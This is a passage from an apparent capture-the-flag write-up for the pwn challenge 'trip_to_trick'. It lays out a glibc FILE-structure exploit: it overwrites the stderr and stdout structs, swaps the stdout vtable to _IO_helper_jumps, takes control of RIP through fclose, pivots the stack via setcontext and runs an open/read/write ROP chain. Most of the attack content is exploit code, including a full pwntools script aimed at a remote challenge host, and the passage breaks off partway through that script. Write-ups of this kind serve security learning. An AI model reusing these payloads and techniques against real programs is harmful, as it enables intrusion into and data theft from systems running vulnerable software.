<p>Filling from <strong>main_arena</strong> until the end of <code>_nl_global_locale</code>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += <span class="string">'\x00'</span>*<span class="number">2208</span> <span class="comment"># MAIN_ARENA</span></span><br><span class="line">INPUT2 += p64(LIBC+<span class="number">0x896b0</span>) + p64(<span class="number">0x0</span>) <span class="comment"># obstack_alloc_failed_handler</span></span><br><span class="line">INPUT2 += p64(LIBC+<span class="number">0x185072</span>)*<span class="number">2</span> <span class="comment"># tzname</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)*<span class="number">4</span> <span class="comment"># program_invocation_short_name</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">1</span>)+p64(<span class="number">2</span>)+p64(LIBC+<span class="number">0x1bd2d8</span>)+p64(<span class="number">0</span>)+p64(<span class="number">-0x1</span>,signed=<span class="keyword">True</span>) <span class="comment"># default_overflow_region</span></span><br><span class="line">INPUT2 += p64(LIBC)+p64(LIBC) <span class="comment"># __libc_utmp_jump_table</span></span><br><span class="line">    </span><br><span class="line"><span class="comment"># _nl_global_locale</span></span><br><span class="line">OFFSETLIST = [<span class="number">1971584</span>, <span class="number">1972928</span>, <span class="number">1973056</span>, <span class="number">1975232</span>, <span class="number">1972480</span>, <span class="number">1972352</span>, <span class="number">0</span>, <span class="number">1974400</span>, <span class="number">1974496</span>, <span class="number">1974624</span>, <span class="number">1974816</span>, <span class="number">1974944</span>, <span class="number">1975040</span>, <span class="number">1680352</span>, <span class="number">1676512</span>, <span class="number">1678048</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">1775224</span>, <span class="number">0</span>]</span><br><span class="line"><span class="keyword">for</span> offset <span class="keyword">in</span> OFFSETLIST:</span><br><span class="line">    <span class="keyword">if</span> offset == <span class="number">0</span>:</span><br><span class="line">        INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line">    <span class="keyword">else</span>:    </span><br><span class="line">        INPUT2 += p64(LIBC+offset)</span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)*<span class="number">2</span></span><br><span class="line">INPUT2 += p64(_IO_LIST_ALL+<span class="number">0x20</span>)+p64(<span class="number">0</span>)*<span class="number">3</span> <span class="comment"># IO_LIST_ALL</span></span><br></pre></td></tr></table></figure></p>
<p>Filling <strong>stderr</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDERR</span></span><br><span class="line">INPUT2 += p64(<span class="number">0xfbad2887</span>) <span class="comment"># _flags</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDERR_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># _chain</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_2_LOCK) <span class="comment"># _lock</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_2) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_FILE_JUMPS) <span class="comment"># vtable</span></span><br></pre></td></tr></table></figure>
<p>Changing stdout vtable from <code>_IO_file_jumps</code> to <code>_IO_helper_jumps</code> to bypass the <strong>mprotect call</strong>:<br><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># STDOUT</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _flags</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_read_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_ptr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_write_end</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">131</span>) <span class="comment"># _IO_buf_base</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_+<span class="number">132</span>) <span class="comment"># _IO_buf_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_backup_base</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _IO_save_end</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _markers</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># _chain</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _fileno</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _flags2</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _old_offset</span></span><br><span class="line">INPUT2 += p16(<span class="number">0x0</span>) <span class="comment"># _cur_column</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _vtable_offset</span></span><br><span class="line">INPUT2 += p8(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _shortbuf</span></span><br><span class="line">INPUT2 += p64(_IO_STDFILE_1_LOCK) <span class="comment"># _lock</span></span><br><span class="line">INPUT2 += p64(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _offset</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _codecvt</span></span><br><span class="line">INPUT2 += p64(_IO_WIDE_DATA_1) <span class="comment"># _wide_data</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_list</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _freeres_buf</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># __pad5</span></span><br><span class="line">INPUT2 += p32(<span class="number">-0x1</span>, signed=<span class="keyword">True</span>) <span class="comment"># _mode</span></span><br><span class="line">INPUT2 += p32(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(<span class="number">0x0</span>) <span class="comment"># _unused2</span></span><br><span class="line">INPUT2 += p64(_IO_HELPER_JUMPS) <span class="comment"># vtable changed to _IO_HELPER_JUMPS</span></span><br></pre></td></tr></table></figure></p>
<p>Filling the <strong>rest</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += p64(_IO_2_1_STDERR_) <span class="comment"># stderr</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDOUT_) <span class="comment"># stdout</span></span><br><span class="line">INPUT2 += p64(_IO_2_1_STDIN_) <span class="comment"># stdin</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#print(len(ROP_CHAIN))</span></span><br><span class="line">INPUT2 += <span class="string">'\x00'</span>*(<span class="number">0x1f</span>*<span class="number">8</span>) <span class="comment"># __elf_set___libc_subfreeres</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>)</span><br></pre></td></tr></table></figure>
<h3 id="Control-Rip-and-stackpivot"><a href="#Control-Rip-and-stackpivot" class="headerlink" title="Control Rip and stackpivot"></a>Control Rip and stackpivot</h3><p>We can control <strong>RIP</strong> by changing <code>_finish</code> from <code>_IO_helper_jumps</code> vtable:<br><a data-fancybox="gallery" href="https://i.imgur.com/NMxH0uq.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/NMxH0uq.png" alt><br></a><br>And why? because <strong>fclose(stdout)</strong> will be executed in the main_function, and it uses pointers from the vtable.</p>
<p>Fclose closes a file stream, and releases the file pointer and related buffer, it will first call <code>_IO_unlink_it</code> to delink the specified FILE from the <code>_chain</code> list:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    _IO_un_link ((struct _IO_FILE_plus *) fp);</span><br></pre></td></tr></table></figure>
<p>After that will call the system interface to close it:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> (fp-&gt;_IO_file_flags &amp; _IO_IS_FILEBUF)</span><br><span class="line">    status = _IO_file_close_it (fp);</span><br></pre></td></tr></table></figure>
<p>Finally, the <a href="https://github.com/lattera/glibc/blob/895ef79e04a953cac1493863bcae29ad85657ee1/libio/iofclose.c#L57" target="_blank" rel="noopener">_IO_FINISH</a> in the vtable is called, which corresponds to the <strong>_IO_file_finish</strong> function:<br><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">_IO_FINISH (fp);</span><br></pre></td></tr></table></figure></p>
<p>Now that we control the rip we need a way to stack pivot, so lets first see the value of the registers when we jump to <code>_IO_FINISH</code> pointer by changing it into <strong>0xdeadbeef</strong>:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># vtable IO_HELPER_JUMPS</span></span><br><span class="line">INPUT2 += p64(<span class="number">0</span>) _DUMMY1</span><br><span class="line">INPUT2 += p64(<span class="number">0</span>) _DUMMY2</span><br><span class="line">INPUT2 += p64(<span class="number">0xdeadbeef</span>) <span class="comment"># _FINISH</span></span><br></pre></td></tr></table></figure>
<p>GDB image on pagefault:<br><a data-fancybox="gallery" href="https://i.imgur.com/fuZATDk.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/fuZATDk.png" alt><br></a><br>So what is exactly stack pivoting? Stacking pivoting is basically changing the stack pointer to point <strong>somewhere</strong> else, we want this because this time our ropchain won’t be <strong>located</strong> in the <strong>stack</strong> but in libc, if we don’t pivot when executing <strong>ret</strong> instructions we will just <strong>jump</strong> into values <strong>in</strong> the <strong>stack</strong> which is not what we want, there is a need to change the <strong>stack pointer</strong> to point into ropchain <strong>location</strong>.</p>
<p>We can control the contents of <strong>RDX</strong>, to use it we need to find something like <strong>mov rsp, qword ptr [rdx]; ret</strong>, a gadget like this can be found at <strong>setcontext+0x35</strong>:<br><a data-fancybox="gallery" href="https://i.imgur.com/4og8ZFu.png" target="_blank" rel="noopener"><br><img src="https://i.imgur.com/4og8ZFu.png" alt><br></a><br>So rdx is right at <code>_IO_helper_jumps</code> so we need to put the rop_chain at <code>_IO_helper_jumps + 0xa0</code> because of the instruction <strong>mov rsp, qword ptr [rdx+0xa0];</strong>, by changing the stack pointer into the right libc address we can easily do the jumps:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line">INPUT2 += p64(<span class="number">0</span>)+p64(<span class="number">0</span>)+p64(SETCONTEXT_SPITVOT) <span class="comment"># _IO_helper_jumps STACKPIVOT SETCONTEXT</span></span><br><span class="line">POPRAX = LIBC + <span class="number">0x0000000000047cf8</span> <span class="comment"># pop rax ; ret</span></span><br><span class="line">POPRDI = LIBC + <span class="number">0x0000000000026542</span> <span class="comment"># pop rdi ; ret</span></span><br><span class="line">POPRDX = LIBC + <span class="number">0x000000000012bda6</span> <span class="comment"># pop rdx ; ret</span></span><br><span class="line">POPRSI = LIBC + <span class="number">0x0000000000026f9e</span> <span class="comment"># pop rsi ; ret</span></span><br><span class="line">SYSCALL = LIBC + <span class="number">0x00000000000cf6c5</span> <span class="comment"># syscall ; ret</span></span><br><span class="line">    </span><br><span class="line">FLAG_PATH = _IO_HELPER_JUMPS+<span class="number">0x178</span><span class="comment">#LIBC+0x1baad8#+16*8</span></span><br><span class="line">ROP_ADDR = _IO_HELPER_JUMPS+<span class="number">0xa8</span><span class="comment">#LIBC+0x1baa08</span></span><br><span class="line"></span><br><span class="line">ROP_CHAIN = p64(POPRAX)*<span class="number">2</span><span class="comment">#p64(OPEN)</span></span><br><span class="line">ROP_CHAIN += p64(<span class="number">2</span>) + p64(POPRDI) + p64(FLAG_PATH) + p64(POPRSI) + p64(<span class="number">0</span>) + p64(SYSCALL) <span class="comment"># OPEN(file=flag_path) syscall == 2</span></span><br><span class="line">ROP_CHAIN += p64(POPRAX) + p64(<span class="number">0</span>) + p64(POPRDI) + p64(<span class="number">3</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># READ(fd=3,buf=flag_path,nbytes=0x49) syscall == 0</span></span><br><span class="line">ROP_CHAIN += p64(POPRAX) + p64(<span class="number">1</span>) + p64(POPRDI) + p64(<span class="number">1</span>) + p64(POPRSI) + p64(FLAG_PATH) + p64(POPRDX) + p64(<span class="number">0x49</span>) +p64(SYSCALL) <span class="comment"># WRITE(fd=1,buf=flag_path,nbyes=0x49) syscall == 1</span></span><br><span class="line">ROP_CHAIN += <span class="string">"flag\x00"</span></span><br><span class="line"></span><br><span class="line">INPUT2 += <span class="string">'\x00'</span>*<span class="number">0x88</span>+p64(ROP_ADDR)+ ROP_CHAIN <span class="comment">#+ '\x00'*(190+7+3) + ROP_CHAIN#+ '\x00'*(0x90-0x88+0x8)+ p64(LIBC)</span></span><br></pre></td></tr></table></figure>
<p>Again we can’t use <strong>execve</strong> but we can use <strong>open</strong>, <strong>read</strong> and <strong>write</strong> which is enought to solve the challenge. In the end we will be executing this:</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">fd= open('flag\x00', 'r') # fd will be equal to 3</span><br><span class="line">read(fd, flag_path, <span class="number">0x49</span>)</span><br><span class="line">write(<span class="number">1</span>, flag_path, <span class="number">0x49</span>)</span><br></pre></td></tr></table></figure>
<p>The reason why fd will be equal to 3 is because <code>_IO_LIST_ALL</code> contains a linked list of the filestreams, by default <strong>stdin</strong>,<strong>stdout</strong> and <strong>stderr</strong> are already loaded so the next is <strong>3</strong>:<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">0(stdin)-&gt;1(stdout)-&gt;2(stderr)-&gt;3(newfd)</span><br></pre></td></tr></table></figure></p>
<p>Full python code:</p>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br><span class="line">131</span><br><span class="line">132</span><br><span class="line">133</span><br><span class="line">134</span><br><span class="line">135</span><br><span class="line">136</span><br><span class="line">137</span><br><span class="line">138</span><br><span class="line">139</span><br><span class="line">140</span><br><span class="line">141</span><br><span class="line">142</span><br><span class="line">143</span><br><span class="line">144</span><br><span class="line">145</span><br><span class="line">146</span><br><span class="line">147</span><br><span class="line">148</span><br><span class="line">149</span><br><span class="line">150</span><br><span class="line">151</span><br><span class="line">152</span><br><span class="line">153</span><br><span class="line">154</span><br><span class="line">155</span><br><span class="line">156</span><br><span class="line">157</span><br><span class="line">158</span><br><span class="line">159</span><br><span class="line">160</span><br><span class="line">161</span><br><span class="line">162</span><br><span class="line">163</span><br><span class="line">164</span><br><span class="line">165</span><br><span class="line">166</span><br><span class="line">167</span><br><span class="line">168</span><br><span class="line">169</span><br><span class="line">170</span><br><span class="line">171</span><br><span class="line">172</span><br><span class="line">173</span><br><span class="line">174</span><br><span class="line">175</span><br><span class="line">176</span><br><span class="line">177</span><br><span class="line">178</span><br><span class="line">179</span><br><span class="line">180</span><br><span class="line">181</span><br><span class="line">182</span><br><span class="line">183</span><br><span class="line">184</span><br><span class="line">185</span><br><span class="line">186</span><br><span class="line">187</span><br><span class="line">188</span><br><span class="line">189</span><br><span class="line">190</span><br><span class="line">191</span><br><span class="line">192</span><br><span class="line">193</span><br><span class="line">194</span><br><span class="line">195</span><br><span class="line">196</span><br><span class="line">197</span><br><span class="line">198</span><br><span class="line">199</span><br><span class="line">200</span><br><span class="line">201</span><br><span class="line">202</span><br><span class="line">203</span><br><span class="line">204</span><br><span class="line">205</span><br><span class="line">206</span><br><span class="line">207</span><br><span class="line">208</span><br><span class="line">209</span><br><span class="line">210</span><br><span class="line">211</span><br><span class="line">212</span><br><span class="line">213</span><br><span class="line">214</span><br><span class="line">215</span><br><span class="line">216</span><br><span class="line">217</span><br><span class="line">218</span><br><span class="line">219</span><br><span class="line">220</span><br><span class="line">221</span><br><span class="line">222</span><br><span class="line">223</span><br><span class="line">224</span><br><span class="line">225</span><br><span class="line">226</span><br><span class="line">227</span><br><span class="line">228</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">host, port = <span class="string">"138.68.67.161"</span>, <span class="string">"20006"</span></span><br><span class="line">filename = <span class="string">"./trip_to_trick"</span></span><br><span class="line">elf = ELF(filename)</span><br><span class="line">context.arch = <span class="string">'amd64'</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE:</span><br><span class="line">    libc = elf.libc</span><br><span class="line"><span class="keyword">else</span>:</span><br><span class="line">    libc = ELF(<span class="string">'./libc.so.6'</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">getConn</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> process(filename) <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">else</span> remote(host, port)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">get_PIE</span><span class="params">(proc)</span>:</span></span><br><span class="line">    memory_map = open(<span class="string">"/proc/&#123;&#125;/maps"</span>.format(proc.pid),<span class="string">"rb"</span>).readlines()</span><br><span class="line">    <span class="keyword">return</span> int(memory_map[<span class="number">0</span>].split(<span class="string">"-"</span>)[<span class="number">0</span>],<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">debug</span><span class="params">(bp)</span>:</span></span><br><span class="line">    script = <span class="string">""</span></span><br><span class="line">    PIE = get_PIE(r)</span><br><span class="line">    PAPA = PIE</span><br><span class="line">    <span class="keyword">for</span> x <span class="keyword">in</span> bp:</span><br><span class="line">        script += <span class="string">"b *0x%x\n"</span>%(PIE+x)</span><br><span class="line">    gdb.attach(r,gdbscript=script)</span><br><span class="line">context.terminal = [<span class="string">'tmux'</span>, <span class="string">'new-window'</span>]</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">exploit</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">global</span> r</span><br><span class="line">    r = getConn()</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> args.REMOTE <span class="keyword">and</span> args.GDB:</span><br><span class="line">        debug([<span class="number">0x000014e2</span>,<span class="number">0x000013ce</span>])</span><br><span class="line">    r.recvuntil(<span class="string">'gift : '</span>)</span><br><span class="line">    SYSTEM = int(r.recvline().rstrip(),<span class="number">16</span>)</span><br><span class="line">    LIBC = SYSTEM-libc.symbols[<span class="string">'system'</span>]</span><br><span class="line"></span><br><span class="line">    _IO_BUF_BASE = <span class="number">0x38</span></span><br><span class="line">    _IO_BUF_END = <span class="number">0x40</span></span><br><span class="line">    </span><br><span class="line">    _IO_2_1_STDIN_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stdin_'</span>]</span><br><span class="line">    _IO_2_1_STDERR_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stderr_'</span>]</span><br><span class="line">    _IO_2_1_STDOUT_ = LIBC+libc.symbols[<span class="string">'_IO_2_1_stdout_'</span>]</span><br><span class="line">    </span><br><span class="line">    _IO_FILE_JUMPS = LIBC+libc.symbols[<span class="string">'_IO_file_jumps'</span>]</span><br><span class="line">    _IO_HELPER_JUMPS = _IO_2_1_STDIN_+<span class="number">0xf60</span></span><br><span class="line">    </span><br><span class="line">    _IO_STDFILE_0_LOCK = _IO_2_1_STDIN_+<span class="number">0x2b90</span></span><br><span class="line">    _IO_WIDE_DATA_0 = _IO_2_1_STDIN_+<span class="number">0xe0</span></span><br><span class="line"></span><br><span class="line">    _IO_STDFILE_1_LOCK = _IO_2_1_STDOUT_+<span class="number">0x1e20</span></span><br><span class="line">    _IO_WIDE_DATA_1 = _IO_2_1_STDOUT_<span class="number">-0xea0</span></span><br><span class="line"></span><br><span class="line">    _IO_STDFILE_2_LOCK = _IO_2_1_STDERR_+<span class="number">0x1ef0</span></span><br><span class="line">    _IO_WIDE_DATA_2 = _IO_2_1_STDERR_<span class="number">-0xf00</span></span><br><span class="line"></span><br><span class="line">    _IO_LIST_ALL = LIBC+libc.symbols[<span class="string">'_IO_list_all'</span>]</span><br><span class="line">    